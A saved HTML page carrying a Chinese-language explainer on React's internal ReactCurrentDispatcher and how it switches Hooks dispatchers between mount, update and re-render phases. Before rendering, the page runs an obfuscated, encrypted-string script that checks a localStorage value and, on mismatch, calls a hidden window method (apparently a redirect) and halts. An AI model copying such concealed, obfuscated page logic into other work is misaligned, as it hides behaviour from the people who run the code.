<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x1afb(e,s){var r=_0x4d6b();return(_0x1afb=function(s,n){var a=r[s-=208];void 0===_0x1afb.vraFvS&&(_0x1afb.stixKU=function(s,n){var a,t=[],e=0,r="";for(s=(s=>{for(var n,a,t="",e="",r=0,o=0;a=s.charAt(o++);~a&&(n=r%4?64*n+a:a,r++%4)&&(t+=String.fromCharCode(255&n>>(-2*r&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,l=t.length;c<l;c++)e+="%"+("00"+t.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(e)})(s),o=0;o<256;o++)t[o]=o;for(o=0;o<256;o++)e=(e+t[o]+n.charCodeAt(o%n.length))%256,a=t[o],t[o]=t[e],t[e]=a;for(var o=0,e=0,c=0;c<s.length;c++)a=t[o=(o+1)%256],t[o]=t[e=(e+t[o])%256],t[e]=a,r+=String.fromCharCode(s.charCodeAt(c)^t[(t[o]+t[e])%256]);return r},e=arguments,_0x1afb.vraFvS=!0);var s=s+r[0],t=e[s];return t?a=t:(void 0===_0x1afb.DhBiEg&&(_0x1afb.DhBiEg=!0),a=_0x1afb.stixKU(a,n),e[s]=a),a})(e,s)}var _0x1eea4b=_0x1afb;if((()=>{for(var s=_0x1afb,n=_0x4d6b();;)try{if(155367==-parseInt(s(225,"A0Jx"))+-parseInt(s(218,"LEYs"))/2*(-parseInt(s(220,"NuQi"))/3)+parseInt(s(228,"wZ!E"))/4+-parseInt(s(222,"1dXZ"))/5+parseInt(s(227,"&&Lo"))/6+parseInt(s(223,"1dXZ"))/7+-parseInt(s(217,"S9ed"))/8*(-parseInt(s(224,"$GzF"))/9))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x1eea4b(209,"naYy")](_0x1eea4b(216,"PAr@"))!=_0x1eea4b(212,"vNWE"))throw window[_0x1eea4b(226,"4^X9")][_0x1eea4b(215,"1dXZ")](_0x1eea4b(208,"S(61")),Error();function _0x4d6b(){var s=["rCoSW7RcVmosWQ4JFf3cNG","WR/cVKC0WPeSB8orW6dcTI/dNq","WRZcUKuZWPKUp8o8W7NcJZtdNmo5","ButcMLXxArK8WPBcPa","W7OXW7yWWQOCW58/WO/cOCoLeW","g8ksWOZcIJ7cHmo4W4a","WRb9W6mnWRS/Cmoxd0ZcPCkQ","gYpcQSoNW4HkWOhcTMK6pfS","nSk/W6zsW5JdUCkpWRySCSk7WQ9a","vNmHfCoFF04","BWRdJ0n9rItdP8kHWR0","W4xcMvvSW4OMrSkeBrelzSk1yLOYW4zgt8oyAIbMWPzGW4a","oceVWPzYjmkf","WPpdISo7W6LZu8kmvCktBsdcNW","DCokW50kjLdcM8kirmkjCSkj","ddxcMM/cVG","WOHNeq00W6W7p8otW64","uKZdM8kQW6JcOtldSCkYW6lcUSkw","W7/dRWzRW4H/Ba","W43dT8oKW5PTW7ZdICo3W68","rCoIW73cUSoUWOe8Dv7cMG","W7XGWObOW7LrWOtcVmkQW78","lmkRdCohDvtdU8kIq8oZDmoZ","WOugcqi3D8kt"];return(_0x4d6b=function(){return s})()}document.title="react ReactCurrentDispatcher 详解",document.getElementById("article").innerHTML='<div><p><code>ReactCurrentDispatcher</code> 是 React 内部使用的一个关键概念，它管理着 React 组件在不同执行阶段所使用的 Hooks 调度器(dispatcher)。下面我将详细介绍它的工作原理和实现细节。</p>\n<h2>基本概念</h2>\n<p><code>ReactCurrentDispatcher</code> 是 React 内部的一个全局变量（实际上是 ReactCurrentDispatcher.current），它决定了在当前执行上下文中使用哪个 Hooks 实现。</p>\n<h2>主要作用</h2>\n<ol>\n<li><strong>控制 Hooks 的行为</strong>  ：根据组件所处的不同阶段（渲染、重渲染、副作用等），React 会切换不同的 dispatcher</li>\n<li><strong>防止 Hooks 在错误时机调用</strong>  ：确保 Hooks 只在函数组件内部调用</li>\n<li><strong>提供开发环境下的额外警告</strong>  ：在开发模式下添加额外的验证和警告</li>\n</ol>\n<h2>实现原理</h2>\n<p>在 React 源码中，<code>ReactCurrentDispatcher</code> 通常是这样定义的：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ReactCurrentDispatcher</span> = {\n  <span class="hljs-attr">current</span>: <span class="hljs-literal">null</span>,\n};\n</code></pre>\n<p>React 会在不同阶段设置不同的 dispatcher：</p>\n<h3>主要 dispatcher 类型</h3>\n<ol>\n<li><strong>ContextOnlyDispatcher</strong>  ：\n<ul>\n<li>默认 dispatcher</li>\n<li>当尝试调用 Hooks 时会抛出错误</li>\n<li>防止在函数组件外部调用 Hooks</li>\n</ul>\n</li>\n<li><strong>HooksDispatcherOnMount</strong>  ：\n<ul>\n<li>组件首次挂载时使用</li>\n<li>初始化 Hooks 的状态</li>\n</ul>\n</li>\n<li><strong>HooksDispatcherOnUpdate</strong>  ：\n<ul>\n<li>组件更新时使用</li>\n<li>处理 Hooks 的更新逻辑</li>\n</ul>\n</li>\n<li><strong>HooksDispatcherOnRerender</strong>  ：\n<ul>\n<li>组件在渲染过程中需要重新渲染时使用</li>\n<li>处理如 useState 的 setState 在渲染期间被调用的情况</li>\n</ul>\n</li>\n</ol>\n<h2>使用场景示例</h2>\n<pre><code class="language-javascript"><span class="hljs-comment">// 在渲染组件前设置正确的 dispatcher</span>\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">renderWithHooks</span>(<span class="hljs-params">current, workInProgress, Component, props</span>) {\n  <span class="hljs-comment">// 根据是否是首次渲染选择不同的 dispatcher</span>\n  <span class="hljs-title class_">ReactCurrentDispatcher</span>.<span class="hljs-property">current</span> =\n    current === <span class="hljs-literal">null</span> || current.<span class="hljs-property">memoizedState</span> === <span class="hljs-literal">null</span>\n      ? <span class="hljs-title class_">HooksDispatcherOnMount</span>\n      : <span class="hljs-title class_">HooksDispatcherOnUpdate</span>;\n  \n  <span class="hljs-comment">// 执行组件函数</span>\n  <span class="hljs-keyword">const</span> children = <span class="hljs-title class_">Component</span>(props);\n  \n  <span class="hljs-comment">// 重置为默认 dispatcher</span>\n  <span class="hljs-title class_">ReactCurrentDispatcher</span>.<span class="hljs-property">current</span> = <span class="hljs-title class_">ContextOnlyDispatcher</span>;\n  \n  <span class="hljs-keyword">return</span> children;\n}\n</code></pre>\n<h2>开发模式下的特殊处理</h2>\n<p>在开发模式下，React 会使用额外的 dispatcher 来提供警告和验证：</p>\n<pre><code class="language-javascript"><span class="hljs-comment">// 开发模式下的 dispatcher</span>\n<span class="hljs-keyword">const</span> <span class="hljs-title class_">HooksDispatcherOnMountInDEV</span> = {\n  <span class="hljs-attr">useState</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">initialState</span>) {\n    <span class="hljs-comment">// 验证是否在函数组件内调用</span>\n    <span class="hljs-comment">// 记录调用位置以便警告</span>\n    <span class="hljs-comment">// 然后调用实际的 useState 实现</span>\n  },\n  <span class="hljs-comment">// 其他 Hooks...</span>\n};\n</code></pre>\n<h2>为什么需要 ReactCurrentDispatcher</h2>\n<ol>\n<li><strong>灵活性</strong>  ：允许 React 在不同阶段改变 Hooks 的行为</li>\n<li><strong>安全性</strong>  ：防止 Hooks 在错误时机被调用</li>\n<li><strong>可维护性</strong>  ：将不同阶段的逻辑分离到不同的 dispatcher 中</li>\n<li><strong>可扩展性</strong>  ：方便添加新的 Hooks 或修改现有 Hooks 的行为</li>\n</ol>\n<h2>总结</h2>\n<p><code>ReactCurrentDispatcher</code> 是 React Hooks 实现的核心机制之一，它通过动态切换不同的 dispatcher 来确保 Hooks 在不同阶段有正确的行为。虽然这是一个内部实现细节，但理解它的工作原理有助于更好地理解 React Hooks 的工作机制。</p>\n</div>'</script></body></html>